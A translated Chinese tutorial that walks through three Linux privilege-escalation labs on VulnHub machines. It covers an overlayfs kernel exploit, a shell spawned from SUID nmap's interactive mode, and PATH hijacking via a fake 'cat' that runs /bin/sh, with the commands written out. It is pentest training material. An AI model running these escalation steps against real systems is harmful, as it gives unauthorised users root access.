# 实战Linux下三种不同方式的提权技巧

##### 译文声明
本文为翻译文章，原文来源：安全客
原文地址：[请提供链接]
译文仅供参考，具体内容及含义以原文为准。

---

## 引言
在渗透测试或漏洞评估过程中，提权是至关重要的一步。黑客和安全研究人员通常会利用exploit、bug或错误配置来提升权限。本文中的所有示例均在虚拟机环境中进行测试，不同的虚拟机镜像可以从VulnHub下载。

---

## 实验一：利用Linux内核漏洞提权

### 背景
VulnOS version 2 是 VulnHub 上的一个 Linux 提权练习。启动虚拟机后，获取到低权限 Shell 后，我们通常需要执行以下步骤：

1. 检测操作系统的发行版本：
   ```bash
   $ lsb_release -a
   ```

2. 查看内核版本：
   ```bash
   $ uname -a
   ```

3. 检测当前用户权限：
   ```bash
   $ whoami
   ```

4. 列出 SUID 文件：
   ```bash
   $ find / -perm -u=s -type f 2>/dev/null
   ```

5. 查看已安装的包、程序和运行的服务，寻找可能存在的漏洞：
   ```bash
   $ dpkg -l
   $ ps aux
   ```

### 示例
在这个例子中，操作系统是 Ubuntu 14.04.4 LTS，内核版本是 3.13.0-24-generic。我们将尝试利用 overlayfs 漏洞进行提权。

#### 步骤
1. 移动到 `/tmp` 目录并创建一个新的文件 `exploit.c`。
   ```bash
   $ cd /tmp
   $ touch exploit.c
   ```

2. 使用 Vim 编辑器将 exploit 代码粘贴到 `exploit.c` 中。
   ```bash
   $ vim exploit.c
   ```

3. 保存并退出 Vim 后，编译代码。
   ```bash
   $ gcc exploit.c -o exploit
   ```

4. 运行编译后的 exploit。
   ```bash
   $ ./exploit
   ```

如果提示没有权限，请使用 `chmod 777 ./exploit` 增加权限后再运行。

5. 获取交互式 shell。
   ```bash
   $ python -c 'import pty; pty.spawn("/bin/bash")'
   ```

### 其他内核漏洞
如果上述方法失败，可以尝试其他内核漏洞，例如：
- Linux Kernel 3.13.0
- Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) – ‘overlayfs’ Local Root Exploit
- Linux Kernel 4.3.3 – ‘overlayfs’ Local Privilege Escalation

**注意**：利用内核漏洞提权有风险，可能会导致系统崩溃。

---

## 实验二：利用低权限用户目录下可被Root权限用户调用的脚本提权

### 背景
Mr.Robot 是另一个从普通用户提权到 root 用户的挑战虚拟机。我们将通过这个例子说明为什么 SUID 程序在提权过程中非常重要。

#### 步骤
1. 查看当前用户：
   ```bash
   $ whoami
   ```

2. 当前用户为 "daemon"，接下来尝试提权到 "root"。

3. 查找系统中的 SUID 文件：
   ```bash
   $ find / -perm -u=s -type f 2>/dev/null
   ```

4. 发现 `nmap` 有 SUID 标志位，查看其版本：
   ```bash
   $ nmap --version
   ```

5. 利用 `nmap` 的 `-interactive` 选项执行 shell 命令：
   ```bash
   $ nmap --interactive
   !sh
   ```

### 注意
如果发现 Nmap 3.48 有 SUID 位，可以按照上述步骤进行测试。

---

## 实验三：利用环境变量劫持高权限程序提权

### 背景
PwnLad 是一个攻击者拥有多个非 root 权限账号的挑战。当前登录的是 "Kane" 账号，没有有效的内核漏洞或其他 SUID 文件，只有在 Kane 的 home 目录下有一个 `msgmike` 文件。

#### 步骤
1. 查看 `msgmike` 文件类型：
   ```bash
   $ file msgmike
   ```

2. 执行 `msgmike` 文件时，报错信息显示它调用了 `cat` 命令读取 `/home/mike/msg.txt` 文件。

3. 通过设置 `$PATH` 环境变量来劫持 `cat` 命令：
   ```bash
   $ export PATH=.:$PATH
   ```

4. 创建一个新的 `cat` 文件并添加执行权限：
   ```bash
   $ echo '/bin/sh' > cat
   $ chmod +x cat
   ```

5. 再次运行 `./msgmike` 命令，触发当前目录下的 `cat`（即 `/bin/sh`），从而提权。

完整的 exploit 如下：
```bash
$ export PATH=.:$PATH
$ echo '/bin/sh' > cat
$ chmod +x cat
$ ./msgmike
```

---

通过以上三个实验，我们可以看到在 Linux 系统中提权的不同方法。每种方法都有其特定的应用场景和风险，实际操作时需谨慎。